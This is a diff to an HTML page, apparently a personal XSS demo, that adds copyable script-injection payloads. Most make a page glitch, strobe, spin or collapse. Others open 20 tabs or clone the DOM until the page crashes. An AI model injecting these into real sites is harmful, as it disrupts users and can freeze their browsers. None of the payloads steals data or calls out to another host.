@@ -277,6 +277,156 @@ setInterval(() =&gt; {
           </pre>
           <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
         </div>
+        <!-- PAYLOAD 9 -->
+<div class="payload-item">
+  <h3>Screen Meltdown</h3>
+  <p class="description">Applies an unstable blur and hue rotation effect, making the entire page look like it's melting and glitching.</p>
+  
+  <pre>
+&lt;script&gt;
+let melt = setInterval(() =&gt; {
+  document.body.style.filter =
+    "blur(" + (Math.random() * 5) + "px) hue-rotate(" + (Math.random() * 360) + "deg)";
+}, 80);
+&lt;/script&gt;
+  </pre>
+
+  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
+</div>
+
+        <!-- PAYLOAD 10 -->
+<div class="payload-item">
+  <h3>Page Implosion</h3>
+  <p class="description">Every element shrinks and collapses into the center of the screen, creating a dramatic implosion effect.</p>
+
+  <pre>
+&lt;script&gt;
+document.querySelectorAll("*").forEach(el =&gt; {
+  el.style.transition = "1s";
+  el.style.transform = "scale(0) translate(-50vw, -50vh)";
+});
+&lt;/script&gt;
+  </pre>
+
+  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
+</div>
+
+        <!-- PAYLOAD 11 -->
+<div class="payload-item">
+  <h3>Acid Trip Mode</h3>
+  <p class="description">Turns the page into a rapidly shifting rainbow strobe show with changing background and text colors.</p>
+
+  <pre>
+&lt;script&gt;
+setInterval(() =&gt; {
+  document.body.style.background =
+    "hsl(" + Math.random() * 360 + ",100%,50%)";
+  document.body.style.color =
+    "hsl(" + Math.random() * 360 + ",80%,70%)";
+}, 120);
+&lt;/script&gt;
+  </pre>
+
+  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
+</div>
+
+<!-- PAYLOAD 12 -->
+<div class="payload-item">
+  <h3>Popup Storm</h3>
+  <p class="description">Rapidly opens 20 new browser tabs. Extremely chaotic.</p>
+
+  <pre>
+&lt;script&gt;
+for (let i = 0; i &lt; 20; i++) {
+  window.open("https://google.com?q=XSS" + i, "_blank");
+}
+&lt;/script&gt;
+  </pre>
+
+  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
+</div>
+
+<!-- PAYLOAD 13 -->
+<div class="payload-item">
+  <h3>DOM Tornado</h3>
+  <p class="description">Makes every element on the page spin in circles while moving around, creating a violent tornado effect.</p>
+
+  <pre>
+&lt;script&gt;
+document.querySelectorAll("*").forEach(el =&gt; {
+  el.style.position = "relative";
+  el.style.animation = "spinmove 1s infinite linear";
+});
+document.body.innerHTML += `
+&lt;style&gt;
+@keyframes spinmove {
+  from { transform: rotate(0deg) translateX(0); }
+  to   { transform: rotate(360deg) translateX(40px); }
+}
+&lt;/style&gt;`;
+&lt;/script&gt;
+  </pre>
+
+  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
+</div>
+
+<!-- PAYLOAD 14 -->
+<div class="payload-item">
+  <h3>Infinite Element Cloner</h3>
+  <p class="description">Continuously duplicates the entire page DOM every 400ms. Usually crashes the page.</p>
+
+  <pre>
+&lt;script&gt;
+setInterval(() =&gt; {
+  document.body.appendChild(
+    document.body.cloneNode(true)
+  );
+}, 400);
+&lt;/script&gt;
+  </pre>
+
+  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
+</div>
+
+<!-- PAYLOAD 15 -->
+<div class="payload-item">
+  <h3>Cursor Skull Trail</h3>
+  <p class="description">Skull emojis follow the user's mouse movement, creating a trail that rapidly appears and disappears.</p>
+
+  <pre>
+&lt;script&gt;
+document.onmousemove = e =&gt; {
+  const s = document.createElement("div");
+  s.textContent = "💀";
+  s.style.position = "fixed";
+  s.style.left = e.clientX + "px";
+  s.style.top = e.clientY + "px";
+  s.style.fontSize = "30px";
+  s.style.pointerEvents = "none";
+  document.body.appendChild(s);
+  setTimeout(() =&gt; s.remove(), 400);
+};
+&lt;/script&gt;
+  </pre>
+
+  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
+</div>
+
+        <!-- PAYLOAD 15 -->
+<div class="payload-item">
+  <h3>Black Hole Collapse</h3>
+  <p class="description">Shrinks the entire page over 5 seconds into a single invisible point.</p>
+
+  <pre>
+&lt;script&gt;
+document.body.style.transition = "5s";
+document.body.style.transformOrigin = "50% 50%";
+document.body.style.transform = "scale(0)";
+&lt;/script&gt;
+  </pre>
+
+  <button class="copy-btn" onclick="copyPayload(event)">Copy</button>
+</div>
 
         <button class="return-btn" onclick="location.href='My_Test.html'">
           ← Return to XSS Demo
